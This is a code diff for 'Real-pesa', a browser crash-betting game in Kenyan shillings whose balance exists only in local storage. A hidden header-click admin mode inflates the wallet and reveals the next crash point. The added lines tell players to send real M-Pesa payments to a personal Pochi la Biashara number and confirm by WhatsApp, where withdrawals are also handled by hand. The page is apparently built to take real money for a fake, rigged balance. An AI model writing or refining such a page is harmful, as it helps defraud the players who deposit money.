@@ -1,92 +1,28 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Real-pesa | Official</title><style>
-:root{--p:#2e7d32;--m:#66bb6a;--d:#0a0a0a;--r:#ff5252;--g:#1a1a1a;}body{font-family:'Segoe UI',sans-serif;margin:0;background:var(--d);color:#fff;text-align:center;overflow-x:hidden;}
-header{background:linear-gradient(to bottom, var(--p), #1b5e20);padding:20px;font-weight:bold;cursor:pointer;}.logo{font-size:1.5rem;letter-spacing:2px;text-shadow:2px 2px #000;}
-#login-scr{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--d);z-index:100;display:flex;flex-direction:column;justify-content:center;align-items:center;}
-.hist{background:var(--g);padding:10px;display:flex;justify-content:center;gap:8px;font-size:0.75rem;border-bottom:1px solid #333;}
-.h-item{background:#444;padding:4px 10px;border-radius:15px;color:var(--m);font-weight:bold;}.game{background:radial-gradient(circle, #222 0%, #000 100%);margin:15px;height:160px;border-radius:15px;border:1px solid #444;display:flex;flex-direction:column;justify-content:center;}
-#mult{font-size:4rem;font-weight:bold;transition:0.05s;}.ctrl{padding:20px;background:var(--g);margin:15px;border-radius:20px;border:1px solid #333;}
-input{width:80%;padding:12px;margin:8px 0;border-radius:10px;border:1px solid #444;background:#111;color:#fff;}
-.btn{width:95%;padding:18px;border:none;border-radius:12px;font-weight:bold;font-size:1.2rem;cursor:pointer;margin-bottom:12px;text-transform:uppercase;}
-.bet{background:var(--m);color:#fff;}.cash{background:#fbc02d;color:#000;}.wd-btn{background:#25d366;color:#fff;font-size:0.9rem;padding:12px;}.dep-btn{background:var(--p);color:#fff;font-size:0.9rem;padding:12px;}
-.tx-list{margin:15px;background:var(--g);padding:15px;border-radius:15px;border:1px solid #333;text-align:left;}
-.tx-item{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:0.8rem;}
-.win-c{color:var(--m);}.loss-c{color:var(--r);}
-</style></head><body>
-<div id="login-scr"><h2>REAL-PESA</h2><input type="text" id="u-name" placeholder="Enter Username"><button class="btn bet" onclick="login()">START PLAYING</button></div>
-<header onclick="showAdmin()"><div class="logo">REAL-PESA</div></header>
-<div class="hist" id="hist"><span>History:</span></div>
-<div class="game"><div id="mult">1.00x</div><div id="stat" style="color:#aaa;font-size:0.8rem;">READY</div></div>
-<div class="ctrl">
-    <div style="margin-bottom:10px;color:var(--m);">Wallet: <span id="bal" style="font-weight:bold;">KES 0.00</span></div>
-    <input type="number" id="amt" placeholder="Bet Amount">
-    <button id="btn" class="btn bet" onclick="action()">Place Bet</button>
-    <div style="display:flex;gap:10px;"><button class="btn dep-btn" style="flex:1;" onclick="deposit()">Deposit</button><button class="btn wd-btn" style="flex:1;" onclick="withdraw()">Withdraw</button></div>
-</div>
-<div class="tx-list">
-    <div style="font-weight:bold;margin-bottom:10px;color:var(--m);">Recent Transactions</div>
-    <div id="tx-data"></div>
-</div>
+<footer style="font-size: 0.8rem; color: #666; padding: 20px; border-top: 1px solid #222; margin-top: 20px;">
+    <strong>OFFICIAL REAL-PESA PAYBILL</strong><br>
+    Pochi la Biashara: <span style="color: #66bb6a;">0797097831</span><br>
+    <p style="font-size: 0.7rem;">Please send the exact amount and wait 2-5 minutes for verification.</p>
+</footer>
+
 <script>
-let m=1.0, isFlying=false, myBet=0, h=[], iv, wallet=0, nextCrash=0, isAdmin=false, txs=[];
-const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('btn'), bl=document.getElementById('bal'), td=document.getElementById('tx-data');
-function save(){ 
-    localStorage.setItem('rp_bal', wallet); 
-    localStorage.setItem('rp_txs', JSON.stringify(txs));
-    bl.innerText="KES "+wallet.toFixed(2); 
-    renderTxs();
-}
-function renderTxs(){
-    td.innerHTML = txs.map(t => `<div class="tx-item"><span>${t.type}</span><span class="${t.amt >=0?'win-c':'loss-c'}">KES ${t.amt}</span></div>`).join('');
-}
-function addTx(type, amt){
-    txs.unshift({type: type, amt: amt});
-    if(txs.length > 5) txs.pop();
-    save();
-}
-function login(){ 
-    let u=document.getElementById('u-name').value; 
-    if(u){ 
-        wallet = parseFloat(localStorage.getItem('rp_bal')) || 0;
-        txs = JSON.parse(localStorage.getItem('rp_txs')) || [];
-        document.getElementById('login-scr').style.display='none'; 
-        save(); loop(); 
-    } 
-}
-function showAdmin(){ 
-    isAdmin=!isAdmin; 
-    let cmd = prompt(isAdmin?"Admin Active. Type 'add' to boost wallet:":"Admin OFF");
-    if(cmd==="add"){ 
-        let a=parseFloat(prompt("Amount?")); 
-        wallet += a; addTx("Admin Deposit", a);
-    }
-}
-function addH(v){h.unshift(v);if(h.length>6)h.pop();let html='<span>History:</span>';h.forEach(i=>{html+=`<span class="h-item">${i}x</span>`});document.getElementById('hist').innerHTML=html;}
-function loop(){
-    isFlying=true; m=1.0; x.style.color="#fff";
-    nextCrash = (Math.random()*7+1.05).toFixed(2);
-    if(isAdmin) s.innerText = "PREDICTION: " + nextCrash + "x";
-    iv=setInterval(()=>{
-        m+=0.01; x.innerText=m.toFixed(2)+"x";
-        if(m>=nextCrash){ clearInterval(iv); isFlying=false; addH(m.toFixed(2));
-            x.innerText="FLEW AWAY!"; x.style.color="var(--r)";
-            if(myBet>0){ b.innerText="Place Bet"; b.className="btn bet"; myBet=0; }
-            setTimeout(loop, 4000);
-        }
-    },100);
-}
-function action(){
-    let a=parseFloat(document.getElementById('amt').value)||10;
-    if(myBet===0 && isFlying && m < 1.15){ 
-        if(wallet < a){ alert("Low Balance!"); return; }
-        myBet=a; wallet -= a; addTx("Place Bet", -a); b.innerText="CASH OUT"; b.className="btn cash"; 
-    } 
-    else if(myBet>0 && isFlying){ 
-        let win = (myBet * m); wallet += win; addTx("Won Round", win.toFixed(0)); 
-        b.innerText="Place Bet"; b.className="btn bet"; myBet=0; alert("Won KES "+win.toFixed(2));
-    }
-}
-function deposit(){ window.location.href=`https://wa.me/254797097831?text=Deposit%20Request`; }
-function withdraw(){ window.location.href=`https://wa.me/254797097831?text=Withdraw%20KES%20${wallet}`; }
-</script></body></html>
+// ... (keep your existing login and game variables here)
+
+function deposit() {
+    const instructions = `HOW TO DEPOSIT:
+1. Go to M-PESA
+2. Select Lipa na M-PESA
+3. Select Pochi la Biashara
+4. Enter Number: 0797097831
+5. Enter Amount & PIN
+
+After payment, click 'OK' to send your transaction details via WhatsApp for instant approval.`;
+
+    alert(instructions);
     
+    // This part opens WhatsApp to your number automatically
+    const whatsappUrl = "https://wa.me/254797097831?text=I%20have%20deposited.%20My%20Username:%20" + document.getElementById('u-name').value;
+    window.location.href = whatsappUrl;
+}
+
+// ... (keep your existing loop and action functions here)
+</script>
